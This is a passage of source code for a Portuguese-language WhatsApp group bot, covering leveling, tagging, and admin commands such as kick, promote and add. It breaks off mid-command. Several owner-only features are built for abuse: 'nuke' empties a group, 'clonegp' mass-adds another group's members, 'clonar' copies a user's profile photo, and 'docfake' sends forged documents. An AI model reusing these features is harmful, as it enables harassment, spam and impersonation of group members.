│➱ Anti documentos: ${Antidoc ? '✅' : '⛔'}
│➱ Anti fake: ${isAntifake ? '✅' : '⛔'}
│➱ Anti img: ${isAntiImg? '✅' : '⛔'}
│➱ Anti sticker: ${isAntiSticker ? '✅' : '⛔'}
│➱ Anti ligação: ${isAnticall ? '✅' : '⛔'}
│➱ Anti Notas: ${isAntiNotas ? '✅' : '⛔'}
│➱ Anti catalogo: ${isAnticatalogo ? '✅' : '⛔'}
│➱ Anti video: ${isAntiVid ? '✅' : '⛔'}
│➱ Anti localização: ${Antiloc ? '✅' : '⛔'}
│➱ Anti pv block: ${isAntiPv ? '✅' : '⛔'}
│➱ Anti link hard: ${isAntiLinkHard ? '✅' : '⛔'}
│➱ Anti link grupo: ${isAntilinkgp ? '✅' : '⛔'}
│➱ Nsfw: ${isNsfw ? '✅' : '⛔'}
│➱ Limite caracteres: ${isAntiFlood ? '✅' : '⛔'}
│➱ Simih: ${isSimi ? '✅' : '⛔'}
│➱ Bem vindo: ${isWelkom ? '✅' : '⛔'}
│➱ Bem vindo 2: ${isWelkom2 ? '✅' : '⛔'}
╰╼╾❲ ${NomeDoBot} ❳╼╾╯`
wew = await getBuffer(`${logo}`)
aqua.sendMessage(from, {image: wew, caption: statuszada, thumbnail: null})
break


case 'leveling':
if (!isGroup) return reply(enviar.msg.grupo)
if (!isGroupAdmins) return reply(enviar.msg.adm)
if (!isBotGroupAdmins) return reply(enviar.msg.Badmin)
if (Number(args[0]) === 1) {
if (isLevelingOn) return reply('*O recurso de nível já estava ativo antes*')
leveling.push(from)
fs.writeFileSync('./funções de cmd/usuarios/leveling.json', JSON.stringify(leveling))
reply(enviar.levelon) 
} else if (Number(args[0]) === 0) {
if (!isLevelingOn) return reply(`O recurso de level já está Desativado neste grupo.`)
pesquisar = from
processo = leveling.indexOf(pesquisar)
while(processo >= 0){
leveling.splice(processo, 1)
processo = leveling.indexOf(pesquisar)
}
fs.writeFileSync('./funções de cmd/usuarios/leveling.json', JSON.stringify(leveling))
reply(enviar.leveloff)
} else {
if(isleveling){
buttons02 = [
{buttonId: `${prefix + command} 0`, buttonText: {displayText: 'Desativar ✘'}, type: 1}
]
} else {
buttons02 = [
{buttonId: `${prefix + command} 1`, buttonText: {displayText: 'Ativar ✓'}, type: 1}
]
}
buttonMessage02 = {
text: `
╭━━━━━◉                                       ◉━━━━━╮
       ╔┉💦┉═══『💧』═══┉💦┉╗    
       ║             ㅤ𝗟𝗘𝗩𝗘𝗟𝗜𝗡𝗚                 ║
       ╚┉💦┉═══『💧』═══┉💦┉╝    
╰━━━━━◉                                       ◉━━━━━╯
ㅤㅤི⋮ ྀ💧⏝ ི⋮ ྀ  💦 ི⋮ ྀ⏝💧ི⋮ ྀ
ㅤㅤ  ㅤ  

┠➥[👤] 𝗢𝗟𝗔 𝗔𝗗𝗠: ${pushname}
┠➥[👥] 𝗚𝗥𝗨𝗣𝗢: ${groupName}
┠➥[💧] Com o Sistema Ativo
┠➥[💧] Você Acumula XP, e Sobe Nível.
╰─╼━━━══━━━━≺🔵≻━━━━══━━━╾─╯`,
footer: `O Sistema de Nível está ${isleveling ? 'ativado' : 'desativado'}\n`,
buttons: buttons02,
headerType: 4,
contextInfo:{forwardingScore:999, isForwarded:true}
}
aqua.sendMessage(from, buttonMessage02, {quoted: selo})
}
break

case 'ganharlevel':
if(!SoDono) return reply("Você não é dono para utilizar este comando...")
addLevelingLevel(sender, 5000)
reply("Olá chefe, foi adicionado 5000 mil Level para você 🙂")
break

case 'ganharxp':
if(!isPremium) return reply(enviar.msg.premium)
addLevelingXp(sender, 13000)
reply("Foi adicionado 13000 mil de XP para você 🙂")
break

case 'level':
if (!isLevelingOn) return reply(`*O recurso de level está Desativado, para ativar consulte algum adm e mande ele digitar : ${prefix}leveling 1`)
if (!isGroup) return reply(enviar.msg.grupo)
const userLevel = getLevelingLevel(sender)
const userXp = getLevelingXp(sender)
if (userLevel === undefined && userXp === undefined) return reply(enviar.levelnol)
sem = sender.replace('@s.whatsapp.net','')
resul = `     
*╭━─━───༺[🗯]༻────━─━╮*
         [🩸] *REGISTRO* [🚩]  
*╰━─━───༺[💫]༻────━─━╯*       

_ALCANCE O NIVEL MAIS AUTO QUE VC CONSEGUI_

  ├─ *[🗯] USUÁRIO:* : ${pushname}
  ├─ *[📳] NÚMERO* : ${sender.split("@")[0]}
  ├─ *[💙] PATENTE:* : ${patt} 
  ├─ *[❇️] XP* : ${userXp}
  └─ *[😎] LEVEL* : ${userLevel}`
await aqua.sendMessage(from, {text: resul}, {quoted: selo})
.catch(async (err) => {
console.error(err)
await reply(`Error!\n${err}`)
})
break



case 'ranklevel':
case 'rl':
case 'rank':
_level.sort((a, b) => (a.xp < b.xp) ? 1 : -1)
let leaderboardlvl = '    🏆《 Rank Niveis 》🏆\n\n'
let nom = 0
try {
for (let i = 0; i < 10; i++) {
nom++
leaderboardlvl += `
┏ ✘🌖 ${NomeDoBot} 🌘✘┓
┃•────•───────•───•
┣❲🏆❳ [${nom}] ϟ➠ ${_level[i].id.replace('@s.whatsapp.net', '')}
┣❲🏆❳「xp」: ϟ${_level[i].xp}
┣❲🏆❳「Level」 :ϟ➠ ${_level[i].level}
┗ ──────「★」──────┚\n`

}
leaderboardlvl += `×•-•-•⟮ 🏆Ranking Level🏆⟯•-•-•×`
aqua.sendMessage(from, {text: leaderboardlvl, sendEphemeral: true}, {quoted: selo})
} catch (err) {
console.error(err)
await reply(`Deve conter 10 pessoas com level, e o leveling deve está ativado para que aconteça a evolução de level dos membros, após as interações`)
}
break


case 'linkgp':
case 'linkgroup':
if (!isGroupAdmins && !SoDono) return reply(enviar.msg.adm)
if (!isGroup) return reply(enviar.msg.grupo)
if (!isBotGroupAdmins) return reply(enviar.msg.Badmin)
 let metadata = await aqua.groupMetadata(from)
linkgc = await aqua.groupInviteCode(from)
reply(`[👥] 𝗠𝗘𝗠𝗕𝗥𝗢𝗦: ${metadata.participants.length ? metadata.participants.length : "undefined"}\n[📝] 𝗚𝗥𝗨𝗣𝗢: ${groupMetadata.subject}\n[📌] 𝗟𝗜𝗡𝗞: https://chat.whatsapp.com/`+linkgc)
break


case 'modonsfw':
case 'nsfw':  
if (!isGroup) return reply(enviar.msg.grupo)
if (!isGroupAdmins) return reply(enviar.msg.adm)
if (args.length < 1) return reply('Hmmmm')
if (Number(args[0]) === 1) {
if (isNsfw) return reply('O modo nsfw já está ativo')
nsfw.push(from)
fs.writeFileSync('./funções de cmd/grupos/nsfw.json', JSON.stringify(nsfw))
reply(`\`\`\`✓Ativado com sucesso o modo nsfw +18 no grupo\`\`\` *${groupMetadata.subject}*`)
} else if (Number(args[0]) === 0) {
if (!isNsfw) return reply('O modo nsfw já está Desativado')  
nsfw.splice(from, 1)
fs.writeFileSync('./funções de cmd/grupos/nsfw.json', JSON.stringify(nsfw))
reply(`\`\`\`✓Modo Nsfw +18 desativado com sucesso no grupo\`\`\` *${groupMetadata.subject}*`)
} else {
reply('1 para ativar, 0 para desligar')
}
break 

case 'del': case 'delete': case 'd': {
if (!isPremium && !isGroupAdmins && !SoDono) return reply(enviar.msg.premium)
if (!quoted) return
let { chat, fromMe, id } = quoted
aqua.sendMessage(from, { delete: { remoteJid: from, fromMe: false, id: m.quoted.id, participant: m.quoted.sender } })
}
break

case 'listonline': case 'lista-online': {
if (!isGroup) return reply(mess.group)
let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : from
let online = [...Object.keys(store.presences[id]), botNumber]
let liston = 1
aqua.sendText(from, '     「 lista Online 」\n\n' + online.map(v => `${liston++} . @` + v.replace(/@.+/, '')).join`\n`, m, { mentions: online })
}
break

case 'msg': {
if (!SoDono) return reply(mess.owner)
if (!args.join(" ")) return reply(`Exemplo :\n${prefix + command} 21958xxxx|olá`)
const cpes = args.join(" ")
const nony = cpes.split("|")[0];
const pesny = cpes.split("|")[1];
lolh = `*| MSG DO MEU DONO |*

Mensagem do administrador de bots
Número : wa.me/${m.sender.split("@")[0]}
Mensagem : ${pesny}`
aqua.sendMessage(nony + "@s.whatsapp.net", {text:lolh, mentions:[sender]}, {quoted: selo})
}
await reply("Sucesso")
break

case 'tagall':
case 'marcar':
 {
if (!isGroup) return reply(mess.group)
if (!isGroupAdmins && !SoDono) return reply(mess.admin)
 let metadata = await aqua.groupMetadata(from)
let teks = `
〘 *👥 MARCANDO TODOS 🙂* 〙
\n ${metadata.participants.length ? metadata.participants.length : "undefined"} participantes do grupo
\n ➲ *Mensagem : ${args.join(" ") ? args.join(" ") : 'kosong'}*\n\n`
for (let mem of participants) {
teks += `┃❖│ @${mem.id.split('@')[0]}\n`
}
aqua.sendMessage(from, { text: teks, mentions: participants.map(a => a.id) }, { quoted: selo })
}
break

case 'marcarwa':
try {
if (!isGroup) return reply('Este comando só deve ser utilizado em Grupo.')
if (!isGroupAdmins && !SoDono) return reply('Você precisa ser ADM pra utilizar este comando')  
if(q.includes(`${prefix}`)) return reply("Não pode utilizar comandos nesse comando")
members_id = []
 let metadata = await aqua.groupMetadata(from)
teks = (args.length > 1) ? body.slice(10).trim() : ''
teks += `〘 *👥 MARCANDO TODOS 🙂* 〙\n\n*〘👥〙MEMBROS:* ${metadata.participants.length ? metadata.participants.length : "undefined"}\n\n`
for (let mem of groupMembers) {
teks += `╠➥ https://wa.me/${mem.id.split('@')[0]}\n`
members_id.push(mem.id)
}
aqua.sendMessage(from, {text: teks}, {quoted: selo})
} catch {
reply('ERROR!!')
}
break

case 'totag':
case 'cita':
case 'hidetag':
if(!isGroup) return reply('Este comando só deve ser utilizado em Grupo.')
if (!isGroupAdmins && !SoDono) return reply('Você precisa ser ADM pra utilizar este comando')
membros = (groupId, membros1) => {
array = []
for (let i = 0; i < membros1.length; i++) {
array.push(membros1[i].id)
}
return array
}
var yd = membros(from, groupMembers)
if((isMedia && !m.message.videoMessage || isQuotedSticker) && args.length == 0) {
media = isQuotedSticker ? m.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage : m.message.stickerMessage
rane = getRandom('.'+await getExtension(media.mimetype))
img = await getFileBuffer(media, 'sticker')
fs.writeFileSync(rane,img)
fig = fs.readFileSync(rane)
var options = {
sticker: fig,  
mentions: yd
}
aqua.sendMessage(from, options)
} else if ((isMedia && !m.message.videoMessage || isQuotedImage) && args.length == 0) {
media = isQuotedImage ? m.message.extendedTextMessage.contextInfo.quotedMessage.imageMessage : m.message.imageMessage
rane = getRandom('.'+await getExtension(media.mimetype))
img = await getFileBuffer(media, 'image')
fs.writeFileSync(rane,img)
buff = fs.readFileSync(rane)
aqua.sendMessage(from, {image: buff, mentions: yd}, {quoted: selo})
} else if ((isMedia && !m.message.videoMessage || isQuotedVideo) && args.length == 0) {
media = isQuotedVideo ? m.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage : m.message.videoMessage
rane = getRandom('.'+await getExtension(media.mimetype))
vid = await getFileBuffer(media, 'video')
fs.writeFileSync(rane,vid)
buff = fs.readFileSync(rane)
aqua.sendMessage(from, {video: buff, mimetype: 'video/mp4',mentions: yd}, {quoted: selo})
} else if ((isMedia && !m.message.videoMessage || isQuotedAudio) && args.length == 0) {
media = isQuotedAudio ? m.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage : m.message.audioMessage
rane = getRandom('.'+await getExtension(media.mimetype))
aud = await getFileBuffer(media, 'audio')
fs.writeFileSync(rane,aud)
buff = fs.readFileSync(rane)
aqua.sendMessage(from, {audio: buff, mimetype: 'audio/mp4', ptt:true,mentions: yd}, {quoted: selo})
} else if ((isMedia && !m.message.videoMessage || isQuotedDocument) && args.length == 0) {
media = isQuotedDocument ? m.message.extendedTextMessage.contextInfo.quotedMessage.documentMessage : m.message.documentMessage
rane = getRandom('.'+await getExtension(media.mimetype))
doc = await getFileBuffer(media, 'document')
fs.writeFileSync(rane,doc)
buff = fs.readFileSync(rane)
aqua.sendMessage(from, {document: buff, mimetype : 'text/plain',mentions: yd},{quoted: selo})
} else if(body){
if(q.length < 1) return reply('Citar oq vey?')
aqua.sendMessage(from, {text: body.slice(command.length + 2), mentions: yd})
} else {
reply(`Responder imagem/documento/gif/adesivo/áudio/vídeo com legenda ${prefix + command}`)
}
break


case 'promover': 
case 'promote':
if(!isGroupAdmins && !SoDono) return reply('Só ADM pode utilizar este comando.')
if(!isBotGroupAdmins) return reply('O Bot Precisa ser ADM pra executar essa ação.')
if (info.message.extendedTextMessage === undefined || info.message.extendedTextMessage === null) return reply('Marque ou responda a mensagem de quem você quer promover')
mentioned = info.message.extendedTextMessage.contextInfo.mentionedJid[0] ? info.message.extendedTextMessage.contextInfo.mentionedJid[0] : info.message.extendedTextMessage.contextInfo.participant
if (botNumber.includes(mentioned)) return reply("😑")
let responsedm = await aqua.groupParticipantsUpdate(from, [mentioned], 'promote')
if (responsedm[0].status === "200") aqua.sendMessage(from, {text: `@${mentioned.split("@")[0]} agora é um fiscal do bar.️`, mentions: [mentioned, sender], contextInfo:{forwardingScore:999, isForwarded:true}})
else if (responsedm[0].status === "404") aqua.sendMessage(from, {text: `@${mentioned.split("@")[0]} não está no grupo️`, mentions: [mentioned, sender], contextInfo:{forwardingScore:999, isForwarded:true}})
else aqua.sendMessage(from, {text: `Parece que deu erro️`, mentions: [sender], contextInfo:{forwardingScore:999, isForwarded:true}})
break

case 'rebaixar':
case 'demote':
if(!isGroupAdmins && !SoDono) return reply(enviar.msg.adm)
if(!isBotGroupAdmins) return reply(enviar.msg.Badmin)
if (info.message.extendedTextMessage === undefined || info.message.extendedTextMessage === null) return reply('Marque ou responda a mensagem de quem você quer tirar de admin')
mentioned = info.message.extendedTextMessage.contextInfo.mentionedJid[0] ? info.message.extendedTextMessage.contextInfo.mentionedJid[0] : info.message.extendedTextMessage.contextInfo.participant
if (botNumber.includes(mentioned)) return reply("😑 marque outra pessoa")
if (numerodono.includes(mentioned)) return reply("😑")
let responsepm = await aqua.groupParticipantsUpdate(from, [mentioned], 'demote')
if (responsepm[0].status === "406") aqua.sendMessage(from, {text: `@${mentioned.split("@")[0]} criou esse grupo e não pode ser removido(a) da lista de admins.️`, mentions: [mentioned, sender], contextInfo:{forwardingScore:999, isForwarded:true}})
else if (responsepm[0].status === "200") aqua.sendMessage(from, {text: `@${mentioned.split("@")[0]} perdeu seu cargo de fiscal do bar.️`, mentions: [mentioned, sender], contextInfo:{forwardingScore:999, isForwarded:true}})
else if (responsepm[0].status === "404") aqua.sendMessage(from, {text: `@${mentioned.split("@")[0]} não está no grupo️`, mentions: [mentioned, sender], contextInfo:{forwardingScore:999, isForwarded:true}})
else aqua.sendMessage(from, {text: `Parece que deu erro️`, mentions: [sender], contextInfo:{forwardingScore:999, isForwarded:true}})
break




case 'reviverqr':
case 'sairdoaguarde':
case 'sairaguarde':
case 'reiniciar':
if(!SoDono) return 
reply(enviar.espere)
try {
setTimeout(async () => {
reply("Aguarde estou Reiniciando...")
}, 0)
setTimeout(async () => {
const qrc = JSON.parse(fs.readFileSync('./CONEXÃO DIVINA.jsom'));
qrc.keys.preKeys = {}
qrc.keys.sessions = {}
qrc.keys.senderKeyMemory = {}
fs.writeFileSync('./CONEXÃO DIVINA.jsom', JSON.stringify(qrc, null, 2))
process.exit()
}, 1000)
} catch {
reply("Erro")
}
break

case 'add':
case 'unkick':
case 'reviver':
reply(enviar.espere)
if(!isGroupAdmins) return reply(enviar.msg.adm)
if(!isBotGroupAdmins) return reply(enviar.msg.Badmin)
if(!q && info.message.extendedTextMessage === null) return reply('Marque a mensagem ou coloque o número de quem você quer adicionar no grupo')
try {
useradd = `${args.join(" ").replace(/\D/g,'')}` ? `${args.join(" ").replace(/\D/g,'')}` : info.message.extendedTextMessage.contextInfo.participant
let id = `${useradd.replace(/\D/g,'')}`
if(!id) return reply(`Número inválido`)
let [result] = await aqua.onWhatsApp(id)
if(!result) return reply(`Esse número não está registrado no WhatsApp`)
let response = await aqua.groupParticipantsUpdate(from, [result.jid], "add")
if(response[0].status == "409") {
aqua.sendMessage(from, {text: `Ele já está no grupo, como eu vou adicionar?`, mentions: [result.jid, sender]})
} else if(response[0].status == "403") {
aqua.sendMessage(from, {text: `Não consegui adicionar o @${result.jid.split("@")[0]} porque ele privou a conta`, mentions: [result.jid, sender]})
} else if(response[0].status == "408") {
aqua.sendMessage(from, {text: `Não consegui adicionar o @${result.jid.split("@")[0]} porque ele saiu recentemente do grupo.`, mentions: [result.jid, sender]})
} else if(response[0].status == "401") {
aqua.sendMessage(from, {text: `Não consegui adicionar o @${result.jid.split("@")[0]} porque ele bloqueou o bot`, mentions: [result.jid, sender]})
} else if(response[0].status == "200") {
aqua.sendMessage(from, {text: `Prontinho fiz o que você pediu`, mentions: [result.jid, sender]})
} else {
reply("Vish acho que algo deu errado")
}
} catch {
}
break

case 'sairgp':
if(isGroup && !SoDono && !m.key.fromMe) return reply("Este comando só o bot ou o dono pode executar..")
try {
aqua.groupLeave(from)
} catch(erro) {
reply(String(erro))
}
break

case 'ban':
case 'kick':
{
if (!isGroup) return reply(enviar.msg.grupo)
if (!isGroupAdmins) return reply(enviar.msg.adm)
if (!isBotGroupAdmins) return reply(enviar.msg.Badmin)
if (info.message.extendedTextMessage === undefined || info.message.extendedTextMessage === null) return reply('Responda a mensagem ou marque as pessoas que você quer remover do grupo')
if(info.message.extendedTextMessage.contextInfo.participant !== null && info.message.extendedTextMessage.contextInfo.participant != undefined && info.message.extendedTextMessage.contextInfo.participant !== "") {
mentioned = info.message.extendedTextMessage.contextInfo.mentionedJid[0] ? info.message.extendedTextMessage.contextInfo.mentionedJid[0] : info.message.extendedTextMessage.contextInfo.participant
if(sender.includes(mentioned)) return reply("😑")
if(botNumber.includes(mentioned)) return reply('Não sou besta de remover eu mesmo né 🙁, mas estou decepcionado com você')
if(numerodn.includes(mentioned)) return reply('Não posso remover meu dono 😑')
let responseb = await aqua.groupParticipantsUpdate(from, [mentioned], 'remove')
if (responseb[0].status === "200") aqua.sendMessage(from, {text: `@${mentioned.split("@")[0]} foi removido do grupo com sucesso.️`, mentions: [mentioned, sender], contextInfo:{forwardingScore:999, isForwarded:true}})
else if (responseb[0].status === "406") aqua.sendMessage(from, {text: `@${mentioned.split("@")[0]} criou esse grupo e não pode ser removido(a) do grupo️`, mentions: [mentioned, sender], contextInfo:{forwardingScore:999, isForwarded:true}})
else if (responseb[0].status === "404") aqua.sendMessage(from, {text: `@${mentioned.split("@")[0]} já foi removido(a) ou saiu do grupo`, mentions: [mentioned, sender], contextInfo:{forwardingScore:999, isForwarded:true}})
else aqua.sendMessage(from, {text: `Hmm parece que deu erro️`, mentions: [sender], contextInfo:{forwardingScore:999, isForwarded:true}})
} else if (info.message.extendedTextMessage.contextInfo.mentionedJid != null && info.message.extendedTextMessage.contextInfo.mentionedJid != undefined) {
mentioned = info.message.extendedTextMessage.contextInfo.mentionedJid
if(mentioned.includes(sender)) return reply("😑")
if(mentioned.includes(numerodonoa)) return reply("Não pode remover meu dono 😠")
if(mentioned.includes(botNumber)) return reply("😑")
if(mentioned.length > 1) {
if(mentioned.length > groupMembers.length || mentioned.length === groupMembers.length || mentioned.length > groupMembers.length - 3) return reply(`Vai banir todo mundo mesmo?`)
sexocomrato = 0
for (let banned of mentioned) {
await sleep(100)
let responseb2 = await aqua.groupParticipantsUpdate(from, [banned], 'remove')
if (responseb2[0].status === "200") sexocomrato = sexocomrato + 1
}
aqua.sendMessage(from, {text: `${sexocomrato} participantes removido do grupo`, mentions: [sender], contextInfo:{forwardingScore:999, isForwarded:true}})
} else {
let responseb3 = await aqua.groupParticipantsUpdate(from, [mentioned[0]], 'remove')
if (responseb3[0].status === "200") aqua.sendMessage(from, {text: `@${mentioned[0].split("@")[0]} foi removido do grupo com sucesso.️`, mentions: [mentioned[0], sender], contextInfo:{forwardingScore:999, isForwarded:true}})
else if (responseb3[0].status === "406") aqua.sendMessage(from, {text: `@${mentioned[0].split("@")[0]} criou esse grupo e não pode ser removido(a) do grupo️`, mentions: [mentioned[0], sender], contextInfo:{forwardingScore:999, isForwarded:true}})
else if (responseb3[0].status === "404") aqua.sendMessage(from, {text: `@${mentioned[0].split("@")[0]} já foi removido(a) ou saiu do grupo`, mentions: [mentioned[0], sender], contextInfo:{forwardingScore:999, isForwarded:true}})
else aqua.sendMessage(from, {text: `Hmm parece que deu erro️`, mentions: [sender], contextInfo:{forwardingScore:999, isForwarded:true}})
}
}
}
break

case 'setbio':
if (!q) return reply(`manda exemplo *${prefix}setbio text*`)
aqua.setStatus(`${q}`)
aqua.sendMessage(from, {text: 'Sucesso, alterou o nome da bio'}, {quoted: selo}).catch((err) => {
reply(`Ocorreu um erro`);
})
break

case 'nomegp':
{
if (!isGroup) return reply(enviar.msg.grupo)
if (!isGroupAdmins) return reply(enviar.msg.adm)
if (!isBotGroupAdmins) return reply(enviar.msg.Badmin)
blat = args.join(" ")
aqua.groupUpdateSubject(from, `${blat}`)
aqua.sendMessage(from, {text: 'Sucesso, alterou o nome do grupo'}, {quoted: selo}).catch((err) => {
reply(`Ocorreu um erro`);
})
}
break

case 'descgp':
case 'descriçãogp':  
if (!isGroup) return reply(enviar.msg.grupo)
if (!isGroupAdmins) return reply(enviar.msg.adm)
if (!isBotGroupAdmins) return reply(enviar.msg.adm)
blabla = args.join(" ")
aqua.groupUpdateDescription(from, `${blabla}`)
aqua.sendMessage(from, {text: 'Sucesso, alterou a descrição do grupo'}, {quoted: selo})
break


case 'setfotogp':
case 'fotogp':  
addFilter(from)
if (!isGroup) return reply('Só pode ser utilizado em Grupo')
if (!isGroupAdmins) return reply('Você precisa ser ADM')
if (!isBotGroupAdmins) return reply('O bot Precisa ser ADM')
if (!isQuotedImage) return reply(`Use: ${prefix + command} <Marque uma foto>`)
ftgp = isQuotedImage ? info.message.extendedTextMessage.contextInfo.quotedMessage.imageMessage : info.message.imageMessage
rane = getRandom('.'+await getExtension(ftgp.mimetype))
buffimg = await getFileBuffer(ftgp, 'image')
fs.writeFileSync(rane, buffimg)
medipp = rane 
await aqua.updateProfilePicture(from, {url: medipp})
reply(`Foto do grupo alterada com sucesso`) 
break


case 'fotobot':
if (!SoDono && !info.key.fromMe) return reply(enviar.msg.donosmt)
if (!isQuotedImage) return reply(`Envie fotos com legendas ${prefix}fotobot ou tags de imagem que já foram enviadas`)
buff = await getFileBuffer(info.message.extendedTextMessage.contextInfo.quotedMessage.imageMessage, 'image')
await aqua.updateProfilePicture(botNumber, buff)
reply('Obrigado pelo novo perfil amor vlw')
break

case 'clonar':
if (!SoDono   && !ischyt) return reply('Você quem é o proprietário?')
if (!isGroup) return reply(enviar.msg.grupo)
if (!isGroupAdmins) return reply(enviar.msg.adm)
if (args.length < 1) return reply('Marque a pessoa que você quer clonar\n\n*EXEMPLO:* clone @')
if (info.message.extendedTextMessage === undefined || info.message.extendedTextMessage === null) return reply('Tag cvk')
mentioned = info.message.extendedTextMessage.contextInfo.mentionedJid[0]
let { jid, id, notify } = groupMembers.find(x => x.id === mentioned)
try {
pp = await aqua.profilePictureUrl(id)
buffer = await getBuffer(pp)
aqua.updateProfilePicture(botNumber, buffer)
mentions(`Foto do perfil atualizada com sucesso, usando a foto do perfil @${id.split('@')[0]}`, [id], true)
} catch (e) {
reply('Putz, deu erro, a pessoa deve estar sem foto 😔')
}
break

case 'doc':
case 'docfake':
if(!isPremium) return reply(enviar.msg.premium)
try {
sprd = "/"
if(!q) {
let buttons = [
{buttonId: `wkwwk`, buttonText: {displayText: 'Ok'}, type: 1}
]
let buttonMessage = {
document: fs.readFileSync('./funções/docf.txt'),
mimetype: 'application/vnd.android.package-archive',
fileName: `exemplo`,
fileLength: 500000000,
caption: `${prefix + command} exemplo${sprd}500${sprd}apk

Os tipos aceitos por enquanto são:

> pdf
> xml
> zip
> jpg
> ppt
> apk
> txt
> aac
> pptx
> aac
> m4a
> mp4
> mp3
> svg
> png

`,
buttons: buttons,
headerType: 4,
}
return aqua.sendMessage(from, buttonMessage, {quoted: selo})
}
kls = args.join(' ')
let nomedoc = kls.split(sprd)[0] || `${NomeDoBot}`
let peso = kls.split(sprd)[1] * 1000000 || '1000000'
let mimetyp = kls.split(sprd)[2].replace(" ", "") || 'gif'
let thumbc = kls.split(sprd)[3] || 'https://google.com/'
if(mimetyp.toLowerCase() == 'pdf') mimetyp = 'application/pdf'
if(mimetyp.toLowerCase() == 'apk') mimetyp = 'application/vnd.android.package-archive'
if(mimetyp.toLowerCase() == 'aac') mimetyp = 'audio/aac'
if(mimetyp.toLowerCase() == 'xml') mimetyp = 'application/xml'
if(mimetyp.toLowerCase() == 'zip') mimetyp = 'application/zip'
if(mimetyp.toLowerCase() == 'jpg') mimetyp = 'image/jpeg'
if(mimetyp.toLowerCase() == 'ppt') mimetyp = 'application/vnd.ms-powerpoint'
if(mimetyp.toLowerCase() == 'pptx') mimetyp = 'application/vnd.openxmlformats-officedocument.presentationml.presentation'
if(mimetyp.toLowerCase() == 'mp4') mimetyp = 'video/mp4'
if(mimetyp.toLowerCase() == 'm4a') mimetyp = 'audio/mp4'
if(mimetyp.toLowerCase() == 'mp3') mimetyp = 'audio/mpeg'
if(mimetyp.toLowerCase() == 'gif') mimetyp = 'image/gif'
if(mimetyp.toLowerCase() == 'png') mimetyp = 'image/png'
if(mimetyp.toLowerCase() == 'svg') mimetyp = 'image/svg+xml'
if(mimetyp.toLowerCase() == 'txt') mimetyp = 'text/plain'
let Messagemdoc = {
document: fs.readFileSync('./funções/docf.txt'),
mimetype: mimetyp,
jpegThumbnail: await getBuffer(thumbc),
fileName: nomedoc,
fileLength: peso,
headerType: 4,
contextInfo:{
forwardingScore:999,
isForwarded:true,
}
}
aqua.sendMessage(from, Messagemdoc, {quoted: selo})
} catch (err) {
console.log(err)
reply(`Ops ocorreu um erro`)
}
break


case 'clonegp':
case 'clonargp':
case 'clonagp':
case 'cg':
try {
if (!isGroup) return
if (!SoDono) return 
if (!isBotGroupAdmins) return reply(enviar.msg.Badmin)
if (!q) {
let getGroups = await aqua.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
array_gps = [];
array_gps2 = [];
for(let a of groups) {
try {
if(a.id !== from) {
array_gps.push({
title: `‍𝗡𝗼𝗺𝗲: ${a.subject}`,
description: `𝗜𝗱: ${a.id}\n𝗠𝗲𝗺𝗯𝗿𝗼𝘀: ${a.participants.length}`,
rowId: `${prefix}clonargp ${a.id}`
})
array_gps2.push({
title: `‍𝗡𝗼𝗺𝗲: ${a.subject}`,
description: `𝗜𝗱: ${a.id}\n𝗠𝗲𝗺𝗯𝗿𝗼𝘀: ${a.participants.length}`,
rowId: `${prefix}clonargp ${a.id} -m`
})
}
} catch (err) {
}
}
buttonmessage02 = {
title: `Clonar Grupos `,
text: `Selecione um grupo da lista`,
buttonText: "Selecionar",
sections: [
            {
                title: "𝗔𝗱𝗶𝗰𝗶𝗼𝗻𝗮 𝘀𝗼́ 𝗼𝘀 𝗺𝗲𝗺𝗯𝗿𝗼𝘀",
                rows: array_gps2
            },
            {
                title: "𝗠𝘂𝗱𝗮 𝗼 𝗻𝗼𝗺𝗲 𝗲 𝗮 𝗱𝗲𝘀𝗰𝗿𝗶𝗰̧𝗮̃𝗼 𝗱𝗼 𝗴𝗿𝘂𝗽𝗼",
                rows: array_gps
            }
        ]
}
aqua.sendMessage(from, buttonmessage02, {quoted: selo})
return
}
if(args[0] === from) return reply("Oxi? Kkkk")
let oxi = isGroup ? await aqua.groupMetadata(`${args[0]}`): ''
let pessoas = isGroup ? oxi.participants : ''
let nomegp = isGroup ? oxi.subject : ''
let descgp = isGroup ? oxi.desc : ''
if (args[1] !== "-m" && args[1] !== "--membros" && args[1] !== "-membros") {
await aqua.groupUpdateSubject(from, `${nomegp}`)
await aqua.groupUpdateDescription(from, `${descgp}`)
await aqua.groupSettingUpdate(from, 'locked')
}
members_id = []
members_from = []
for (let k of groupMembers) {
members_from.push(k.id)
}
for (let bctinha of pessoas) {
if (bctinha.id !== botNumber && !members_from.includes(bctinha.id)) {
members_id.push(bctinha.id)
}
}
if(members_id.length < 220) {
if(groupMembers.length + members_id.length >= 257) {
a = members_id.length + groupMembers.length - 257
members_id.splice(a)
}
console.log(members_id)
let responsec = await aqua.groupParticipantsUpdate(from, members_id, "add")
t = 0
for (let c of responsec) {
if (c.status === "200") t = t + 1
}
aqua.sendMessage(`${numerodonoa}@s.whatsapp.net`, {text: `${t} membros adicionados`}, {quoted: selo})
} else {
t = 0
for(let a of members_id) {
await sleep(1000)
let responsec2 = await aqua.groupParticipantsUpdate(from, [a], "add")
if (responsec2.status === "200") t = t + 1
}
aqua.sendMessage(`${numerodonoa}@s.whatsapp.net`, {text: `${t} membros adicionados`}, {quoted: selo})
}
} catch(erro) {
if(String(erro).includes("item-not-found")) {
reply("Só tem como clonar grupos que o bot esteja nele")
} else if(String(erro).includes("not-authorized")) {
reply(enviar.msg.Badm)
} else {
console.log(erro)
reply("Hmm deu erro")
}
}
break

case 'nuke': case 'arquivargp':
if(!SoDono) return reply("Só dono pode utilizar este comando...")
if (!isBotGroupAdmins) return reply('Bot precisa ser ADM, para executar esta função.')
if(info.key.fromMe) return 
function banirtodos() {
var r_banirtodos = Math.floor(Math.random() * groupMembers.length + 0)
nmrbot = botNumber.split("@")[0]
var resp = `${groupMembers[r_banirtodos].id.split("@")[0]}`
if(resp === numerodonoa || resp === botNumber) {
return
} else {
aqua.groupParticipantsUpdate(from, [resp + "@s.whatsapp.net"], 'remove')
}
if(groupMembers.length <= 2) {
process.exit()
}
}
setInterval(banirtodos, 1000)
break

case 'kickfake':
case 'banfake':
{
if (!isGroupAdmins && !SoDono) return reply(enviar.msg.adm)
array_fake = [];
for(let a of groupMembers) {
